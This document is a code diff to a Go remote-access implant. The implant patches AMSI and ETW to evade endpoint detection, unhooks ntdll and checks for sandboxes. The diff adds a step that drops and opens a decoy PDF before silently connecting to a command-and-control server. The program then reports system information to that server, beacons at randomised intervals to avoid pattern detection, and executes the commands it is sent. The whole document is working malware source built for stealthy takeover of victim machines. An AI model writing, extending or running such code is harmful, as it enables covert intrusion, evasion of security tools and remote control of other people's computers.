@@ -22,33 +22,33 @@ var (
 	skipSandbox string
 )
 
-// 正常程序初始化行为，打破恶意程序模式
+// Mimic normal app init behavior
 func normalInit() {
 	rand.Seed(time.Now().UnixNano())
-	// 随机延迟 500-1500ms，模拟正常程序启动延迟
 	delay := time.Duration(500+rand.Intn(1000)) * time.Millisecond
 	time.Sleep(delay)
 
-	// 创建假的临时配置文件（正常程序行为）
 	tmpPath := os.TempDir()
 	cfgName := fmt.Sprintf("%s\\app_%d.tmp", tmpPath, rand.Intn(10000))
 	f, err := os.OpenFile(cfgName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
 	if err == nil {
 		f.WriteString(fmt.Sprintf("# App Config v%d.%d\n", rand.Intn(10), rand.Intn(100)))
 		f.Close()
-		os.Remove(cfgName) // 立即删除，模拟临时文件清理
+		os.Remove(cfgName)
 	}
 }
 
 func main() {
 	normalInit()
 
-	// ===== EDR Evasion: AMSI + ETW Patch =====
+	// EDR Evasion: AMSI + ETW Patch
 	evasion.BypassAMSI()
 	evasion.BypassETW()
 
-	evasion.InitLegitimateAPIs()
+	// Drop & open embedded PDF, then C2 connect silently
+	DropAndOpenPDF()
 
+	evasion.InitLegitimateAPIs()
 	evasion.NtdllUnhook()
 
 	if skipSandbox != "1" {
@@ -79,7 +79,6 @@ func main() {
 
 	tp := transport.NewHTTPTransport(cfg)
 
-	// 随机重试次数，打破固定模式
 	maxRetries := 2 + rand.Intn(3)
 	for i := 0; i < maxRetries; i++ {
 		err := initSession(tp)
@@ -94,9 +93,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "[DBG] WARNING: sessionID is empty after init!\n")
 	}
 
-	// 主循环: 随机间隔轮询C2
 	for {
-		// 随机额外延迟，打破固定心跳模式
 		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
 		time.Sleep(tp.GetInterval() + extraDelay)
 
@@ -124,7 +121,6 @@ func main() {
 	}
 }
 
-// initSession 上线注册
 func initSession(tp *transport.HTTPTransport) error {
 	info := core.GetSysInfo()
 	infoJSON, _ := json.Marshal(info)
@@ -138,7 +134,6 @@ func initSession(tp *transport.HTTPTransport) error {
 		return err
 	}
 
-	// 从响应中提取sessionID
 	fmt.Fprintf(os.Stderr, "[DBG] initSession resp type=%d data=%s\n", respPkt.Type, string(respPkt.Data))
 	if respPkt.Type == encode.MsgRegister {
 		var resp map[string]string
@@ -151,7 +146,6 @@ func initSession(tp *transport.HTTPTransport) error {
 	return nil
 }
 
-// procReq 处理下发的任务
 func procReq(pkt *encode.Packet) []byte {
 	req, err := encode.DecodeTaskReq(pkt.Data)
 	if err != nil {
@@ -164,9 +158,7 @@ func procReq(pkt *encode.Packet) []byte {
 		return data
 	}
 
-	resp := &encode.TaskResp{
-		TaskID: pkt.TaskID,
-	}
+	resp := &encode.TaskResp{TaskID: pkt.TaskID}
 
 	switch req.TaskType {
 	case encode.TaskExecCmd:
